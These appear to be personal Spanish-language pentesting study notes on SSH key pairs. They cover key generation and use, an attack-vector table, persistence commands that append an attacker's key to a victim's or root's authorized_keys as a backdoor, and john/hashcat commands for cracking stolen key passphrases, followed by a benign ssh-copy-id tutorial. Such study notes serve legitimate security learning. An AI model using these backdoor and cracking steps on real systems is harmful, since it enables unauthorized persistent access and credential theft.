---
aliases:
  - "Symfonos 2.png"
  - "putty"
  - "puttygen"
  - "Putty2SSH"
  - "SSH Key Manipulation"
  - "Reading id_rsa"
  - "SSH Key Exfiltration"
  - SSH Keys
  - SSH Key Pairs
tags:
  - service/ssh
  - cred/ssh
kind: Concept
linked:
  - "[[SSH (22) - Enumeración]]"
---
# Pares de claves SSH

> [!info]
> Autenticación SSH via key-pair (asimétrica). Private key local del cliente, public key en `~/.ssh/authorized_keys` del server. Vectores: theft, weak key, default keys, agent abuse.

---

## Generación

```bash
# Generar par RSA 4096
ssh-keygen -t rsa -b 4096 -f mykey -N ''  # -N '' = sin passphrase

# Ed25519 (moderno, recomendado)
ssh-keygen -t ed25519 -f mykey -N ''
```

Genera:
- `mykey` (private, modo `600`)
- `mykey.pub` (public, agregar a `authorized_keys` del target)

---

## Uso

```bash
# Setup
chmod 600 mykey
ssh -i mykey user@target

# Si server rejecta nuevas keys
ssh -i mykey -o IdentitiesOnly=yes user@target
```

---

## Vectores de ataque

| Vector | Descripción |
|---|---|
| **Key theft** | Robar private key desde filesystem (`/home/*/.ssh/id_rsa`) post-exploit |
| **Authorized keys plant** | Si tenés write access a `~/.ssh/authorized_keys`, agregar tu pub key |
| **Default/leaked keys** | Vendors con keys hardcoded (CVE-2008-0166 OpenSSL Debian) |
| **Passphrase crack** | `ssh2john id_rsa > h; john --wordlist=rockyou.txt h` |
| **Agent forwarding abuse** | `SSH_AUTH_SOCK` → impersonar usuarios pivoting |
| **Known_hosts mining** | `~/.ssh/known_hosts` lista hosts donde el user se conectó |
| **No host check** | `StrictHostKeyChecking=no` → MITM trivial |
| **Weak key sizes** | RSA <2048, DSA |

---

## Persistence

```bash
# Plant key en victima
echo 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys

# Si root → backdoor accesible siempre
echo 'ssh-ed25519 AAAA... pwn' >> /root/.ssh/authorized_keys

# Restrict to specific command (covert)
echo 'command="/bin/bash" ssh-ed25519 AAAA...' >> ~/.ssh/authorized_keys
```

---

## Crack passphrase

```bash
# Hash extract
ssh2john id_rsa > sshkey.hash

# Crack
john --wordlist=rockyou.txt sshkey.hash
hashcat -m 22921 sshkey.hash rockyou.txt  # SSH RSA
hashcat -m 22931 sshkey.hash rockyou.txt  # SSH ED25519
```

---

## Notas Relacionadas

- [[SSH (22) - Enumeración]]
- [[Cracking Hashes]]
- [[Linux Privilege Escalation]]


---

#  Pares de claves SSH

### Definición 

> [!INFO] Pares de claves SSH
>Los pares de claves SSH son fundamentales para la autenticación segura en comunicaciones de red, especialmente en conexiones a servidores remotos. Aquí tienes una explicación detallada de cómo funcionan:
^definicion

### Pares de Claves SSH

1. **Clave Privada**: Esta se mantiene en secreto y se guarda en el cliente (tu máquina). Se utiliza para autenticarse ante el servidor.
2. **Clave Pública**: Esta se comparte con el servidor y se guarda en el archivo `~/.ssh/authorized_keys` del usuario en el servidor.

### Generar el Par de Claves

   ```sh
   ssh-keygen -t rsa -b 4096 -C "tu_email@example.com"
   ```
   Esto generará dos archivos: `id_rsa` (clave privada) y `id_rsa.pub` (clave pública).

### Procedimiento Manual

1. **Copiar la Clave Pública al Servidor**:
   - Abre la clave pública (`id_rsa.pub`).
   - Conéctate al servidor y añade el contenido de `id_rsa.pub` al archivo `~/.ssh/authorized_keys` del usuario con el que te conectarás.

   ```sh
   cat id_rsa.pub >> authorized_keys
   # o
   cp id_rsa.pub authorized_keys
   ```
   *En ambos casos la ruta donde se copiar la clave publica es al authorized_keys del servidor, no el de mí pc*

### Usando `ssh-copy-id`

El comando `ssh-copy-id` facilita este proceso:

1. **Ejecutar el Comando**:
   ```bash
   # Este comando busca automaticamente la clave publica que pasara a authorized_keys (el authorized_keys de la maquina el cual vamos a conectarnos, no de la maquina el cual ejecutamos el comando)
   ssh-copy-id usuario@servidor 
   ```
```bash
 # En caso de querer especificar la clave publica a la que quiero transformar en authorized_keys:
   ssh-copy-id -i id_rsa.pub usuario@servidor
```

   El comando `ssh-copy-id` copia automáticamente el contenido de tu clave pública (`id_rsa.pub`) al archivo `~/.ssh/authorized_keys` en el servidor.

### Diferencias Clave

- **Manual**:
  - Puedes editar directamente el archivo `authorized_keys` para agregar o eliminar claves.
  - Necesitas tener acceso al servidor y permisos para modificar el archivo.

- **`ssh-copy-id`**:
  - Simplifica el proceso al automatizar la copia de la clave pública al servidor.
  - No necesitas manualmente editar el archivo `authorized_keys`.

### Aclaración Importante

- **La clave privada nunca se comparte**: Debe permanecer segura y almacenada en tu máquina cliente.

En resumen, la clave pública se almacena en el servidor, y la clave privada se guarda en tu máquina cliente. El comando `ssh-copy-id` simplemente facilita el proceso de copiar la clave pública al servidor.
